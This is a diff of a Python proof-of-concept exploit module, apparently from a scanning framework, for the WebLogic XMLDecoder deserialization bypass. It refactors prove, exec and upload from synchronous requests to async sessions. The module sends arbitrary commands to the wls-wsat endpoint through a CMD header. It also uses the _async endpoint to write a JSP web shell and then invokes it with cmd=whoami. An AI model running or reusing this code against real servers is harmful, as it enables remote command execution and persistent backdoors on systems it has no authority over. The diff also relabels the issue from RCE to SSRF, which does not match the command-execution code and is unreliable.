@@ -3,7 +3,8 @@
 # @author: 'orleven'
 
 import random
-from script import Script, SERVICE_PORT_MAP
+from lib.utils.connect import ClientSession
+from script import Script, SERVICE_PORT_MAP, VUL_LEVEL, VUL_TYPE
 
 '''
 /wls-wsat/CoordinatorPortType
@@ -23021,12 +23022,12 @@ class POC(Script):
         self.name = 'Weblogic XMLdecode bypass'
         self.keyword = ['weblogic']
         self.info = 'Weblogic XMLdecode bypass'
-        self.type = 'rce'
-        self.level = 'high'
+        self.type = VUL_TYPE.SSRF
+        self.level = VUL_LEVEL.CRITICAL
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        self.get_url()
+    async def prove(self):
+        await self.get_url()
         if self.base_url:
             url1 = self.base_url + 'wls-wsat/CoordinatorPortType11;/1'
             ran = str(random.randint(100000, 999999))
@@ -23035,30 +23036,33 @@ class POC(Script):
                 "SOAPAction": "",
                 "CMD": "echo %s" %ran  ,
             }
-            res = self.curl('post', url1, headers=headers1, data=coordinatorportype_poc)
-            if res!=None and ran in res.text:
-                self.flag = 1
-                self.res.append({"info": url1, "key": 'Weblogic XMLdecode bypass'})
-                return
-            else:
-                url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
-                filename = ran + '.txt'
-                headers2 = {
-                    "Content-Type": "text/xml",
-                    "SOAPAction": "",
-                    "fileName" : filename,
-                }
-                res = self.curl('post', url2, headers=headers2, data=asyncresponseservice_poc)
-                url21 = self.base_url + '_async/' + str(filename)
-                res = self.curl('get', url21, headers=headers2)
-                if res != None and 'request.getParameter("cmd")' in res.text:
-                    self.flag = 1
-                    self.res.append({"info": url21, "key": 'Weblogic XMLdecode bypass'})
-                    return
+            async with ClientSession() as session:
+                async with session.post(url=url1, headers=headers1, data=coordinatorportype_poc) as res:
+                    if res!=None and ran in await res.text():
+                        self.flag = 1
+                        self.res.append({"info": url1, "key": 'Weblogic XMLdecode bypass'})
+                        return
+                    else:
+                        url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
+                        filename = ran + '.txt'
+                        headers2 = {
+                            "Content-Type": "text/xml",
+                            "SOAPAction": "",
+                            "fileName" : filename,
+                        }
+                        async with session.post(url=url2, headers=headers2, data=asyncresponseservice_poc) as res2:
+                            url21 = self.base_url + '_async/' + str(filename)
+                            async with session.get(url=url21, headers=headers2) as res21:
+                                if res21 != None:
+                                    text = await res21.text()
+                                    if 'request.getParameter("cmd")' in text:
+                                        self.flag = 1
+                                        self.res.append({"info": url21, "key": 'Weblogic XMLdecode bypass'})
+                                        return
 
 
-    def exec(self):
-        self.get_url()
+    async def exec(self):
+        await self.get_url()
         if self.base_url:
             url1 = self.base_url + 'wls-wsat/CoordinatorPortType11;/1'
             ran = str(random.randint(100000, 999999))
@@ -23068,30 +23072,31 @@ class POC(Script):
                 "SOAPAction": "",
                 "CMD": command,
             }
-            res = self.curl('post', url1, headers=headers1, data=coordinatorportype_poc)
-            if res!=None:
-                self.flag = 1
-                self.res.append({"info": res.text, "key": 'Weblogic XMLdecode bypass'})
-                return
-            else:
-                url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
-                filename = ran + '.jsp'
-                headers2 = {
-                    "Content-Type": "text/xml",
-                    "SOAPAction": "",
-                    "fileName" : filename,
-                }
-                res = self.curl('post', url2, headers=headers2, data=asyncresponseservice_poc)
-                url21 = self.base_url + '_async/' + filename
-                data = 'cmd=%s'%command
-                res = self.curl('get', url21, data=data, headers=headers2)
-                if res != None :
-                    self.flag = 1
-                    self.res.append({"info": res.text, "key": 'Weblogic XMLdecode bypass'})
-                    return
+            async with ClientSession() as session:
+                async with session.post(url=url1, headers=headers1, data=coordinatorportype_poc) as res:
+                    if res!=None:
+                        self.flag = 1
+                        self.res.append({"info": res.text, "key": 'Weblogic XMLdecode bypass'})
+                        return
+                    else:
+                        url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
+                        filename = ran + '.jsp'
+                        headers2 = {
+                            "Content-Type": "text/xml",
+                            "SOAPAction": "",
+                            "fileName" : filename,
+                        }
+                        async with session.post(url=url2, headers=headers2, data=asyncresponseservice_poc) as res:
+                            url21 = self.base_url + '_async/' + filename
+                            data = 'cmd=%s'%command
+                            async with session.get(url=url21, data=data, headers=headers2) as res:
+                                if res != None :
+                                    self.flag = 1
+                                    self.res.append({"info": res.text, "key": 'Weblogic XMLdecode bypass'})
+                                    return
 
-    def upload(self):
-        self.get_url()
+    async def upload(self):
+        await self.get_url()
         if self.base_url:
             ran = str(random.randint(100000, 999999))
             url2 = self.base_url + '_async/AsyncResponseServiceHttps;/1'
@@ -23101,9 +23106,10 @@ class POC(Script):
                 "SOAPAction": "",
                 "fileName" : filename,
             }
-            res = self.curl('post', url2, headers=headers2, data=asyncresponseservice_poc)
-            url21 = self.base_url + '_async/' + filename
-            res = self.curl('get', url21, headers=headers2)
-            if res != None :
-                self.flag = 1
-                self.res.append({"info": url21+'?cmd=whoami', "key": 'Weblogic XMLdecode bypass'})
+            async with ClientSession() as session:
+                async with session.post(url=url2, headers=headers2, data=asyncresponseservice_poc) as res:
+                    url21 = self.base_url + '_async/' + filename
+                    async with session.post(url=url21, headers=headers2) as res:
+                        if res != None :
+                            self.flag = 1
+                            self.res.append({"info": url21+'?cmd=whoami', "key": 'Weblogic XMLdecode bypass'})
